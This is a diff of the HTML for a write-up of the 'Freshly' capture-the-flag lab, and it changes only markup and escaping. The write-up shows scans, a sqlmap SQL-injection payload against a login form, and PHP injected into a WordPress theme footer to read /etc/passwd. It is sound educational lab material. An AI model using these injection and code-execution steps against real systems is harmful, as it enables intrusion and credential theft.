@@ -104,9 +104,9 @@ secret hidden in a sensitive file. If you can find the secret, send me an email
 for verification. :)"</p>
 
 
-<h1 id="discovery">Discovery</h1>
+<h1>Discovery</h1>
 <p>As always we need to know which ports are open.</p>
-<h2 id="nmap">nmap</h2>
+<h2>nmap</h2>
 <div class="highlight"><pre><span></span># Nmap 6.47 scan initiated Thu Apr 16 19:13:39 2015 as: nmap -A -A -oA nmap 10.0.2.5
 Nmap scan report for 10.0.2.5
 Host is up (0.00087s latency).
@@ -137,10 +137,10 @@ Service detection performed. Please report any incorrect results at http://nmap.
 <li>The 8080 is a wordpress website which seems to sell candy (who doesn't love
       candy?).</li>
 </ul>
-<p><img alt="not the droids" src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif" /></p>
+<p><img alt="not the droids" src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"></p>
 <p><em>I try to see if there was any differences between this gif and the original
 one, but nothing.</em></p>
-<h2 id="nikto">Nikto</h2>
+<h2>Nikto</h2>
 <p>I like to use <a href="https://cirt.net/Nikto2">Nikto</a> when discovering website, I will put only the
 interesting stuff, but I ran <a href="https://cirt.net/Nikto2">Nikto</a> on the 3 ports.</p>
 <p>Port 80:</p>
@@ -151,7 +151,7 @@ Server: Apache/2.4.7 (Ubuntu)
 </pre></div>
 
 
-<p><img alt="login.php" src="/media/2015.04/login.php.png" /></p>
+<p><img alt="login.php" src="/media/2015.04/login.php.png"></p>
 <p>Port 8080:</p>
 <div class="highlight"><pre><span></span>[maggick@rootine Freshly]$ nikto -host 10.0.2.5 -port 8080
 + OSVDB-3268: /img/: Directory indexing found.
@@ -161,10 +161,10 @@ Server: Apache/2.4.7 (Ubuntu)
 
 <p>We got two login interfaces and a directory listing with images. Let's take a
 look at the wordpress installation.</p>
-<p><img alt="wordpress, index" src="/media/2015.04/wordpress_index.png" /></p>
+<p><img alt="wordpress, index" src="/media/2015.04/wordpress_index.png"></p>
 <p><em>The directory listening was not of any use. As well the phpmyadmin interface
 was not usefull.</em></p>
-<h2 id="wpscan">WPScan</h2>
+<h2>WPScan</h2>
 <p>We run <a href="https://github.com/wpscanteam/wpscan"><code>wpscan</code></a> on the 8080 website:</p>
 <div class="highlight"><pre><span></span>[maggick@rootine wpscan]$ ruby wpscan.rb --url http://10.0.2.5:8080/wordpress/
 [+] URL: http://10.0.2.5:8080/wordpress/
@@ -185,7 +185,7 @@ was not usefull.</em></p>
  |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/
  |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt
 
-[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection
+[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection
     Reference: https://wpvulndb.com/vulnerabilities/7737
     Reference: https://research.g0blin.co.uk/g0blin-00022/
     Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
@@ -208,7 +208,7 @@ was not usefull.</em></p>
  |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/
  |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/readme.txt
 
-[!] Title: All in One SEO Pack &lt;= 2.2.5.1 - Authentication Bypass
+[!] Title: All in One SEO Pack &amp;lt;= 2.2.5.1 - Authentication Bypass
     Reference: https://wpvulndb.com/vulnerabilities/7881
     Reference: http://jvn.jp/en/jp/JVN75615300/index.html
     Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
@@ -225,10 +225,10 @@ we notice that:</p>
 <li>proplayer 4.7.9.1 - SQL Injection: Concerns a non available URL (you can run sqlmap on it to confirm this)</li>
 </ul>
 <p>Therefore none of this will help us in this challenge.</p>
-<h1 id="exploit">Exploit</h1>
+<h1>Exploit</h1>
 <p>Nikto shows us some interesting URL. The login interface at <code>login.php</code> may be
 injectable.</p>
-<h2 id="sqlmap">sqlmap</h2>
+<h2>sqlmap</h2>
 <p>We need to use burp in order to save the POST request to a file, an then we
 launch <a href="http://sqlmap,org">sqlmap</a> on the <code>login.php</code> URL:</p>
 <div class="highlight"><pre><span></span>[maggick@rootine sqlmap]$ python2 sqlmap.py -r login_req -p user
@@ -249,8 +249,8 @@ requests:
 ---
 Parameter: user (POST)
     Type: AND/OR time-based blind
-    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
-    Payload: user=asdf&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))RaKL) AND &#39;KuPd&#39;=&#39;KuPd&amp;password=asdf&amp;s=Submit
+    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)
+    Payload: user=asdf&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))RaKL) AND &#39;KuPd&#39;=&#39;KuPd&amp;amp;password=asdf&amp;amp;s=Submit
 ---
 [20:43:22] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu
@@ -305,17 +305,17 @@ Table: users
 
 
 <p>So we got some passwords. Then let's use the wordpress password.</p>
-<h2 id="admin-php-and-flag">Admin, PHP and Flag</h2>
+<h2>Admin, PHP and Flag</h2>
 <p>We got the admin password for <code>http://10.0.2.5:8080/wordpress/wp-login</code>.</p>
-<p><img alt="wordpress, admin interface" src="/media/2015.04/wordpress_admin.png" /></p>
+<p><img alt="wordpress, admin interface" src="/media/2015.04/wordpress_admin.png"></p>
 <p>As we want to read a file on the system, let's put some PHP code in the theme:
 We go to Appearance -&gt; Editor -&gt; Footer (footer.php) and add some PHP code in
 order to execute it, let's get the <code>/etc/passwd</code> file :</p>
-<div class="highlight"><pre><span></span><span class="x"> </span><span class="cp">&lt;?php</span>
-<span class="nv">$myfile</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Unable to open file!&quot;</span><span class="p">);</span>
-<span class="k">echo</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nb">filesize</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">));</span>
-<span class="nb">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="x"></span>
+<div class="highlight"><pre><span></span><span class="x"> &amp;lt;?php</span>
+<span class="x">$myfile = fopen(&quot;/etc/passwd&quot;, &quot;r&quot;) or die(&quot;Unable to open file!&quot;);</span>
+<span class="x">echo fread($myfile,filesize(&quot;/etc/passwd&quot;));</span>
+<span class="x">fclose($myfile);</span>
+<span class="x">?&amp;gt;</span>
 </pre></div>
 
 
@@ -353,7 +353,7 @@ candycane:x:1001:1001::/home/candycane:
 No need to root the system… sadly.</p>
 <p>As there is not ssh port open, I tried to log on the VM with
 <code>root:SuperSecretPassword</code> and it simply worked.</p>
-<h1 id="summary">Summary</h1>
+<h1>Summary</h1>
 <p>This was a simple challenge, based on web pentesting.
 It was a bit short but nonetheless interesting.</p>
 <p>Road to flag:</p>
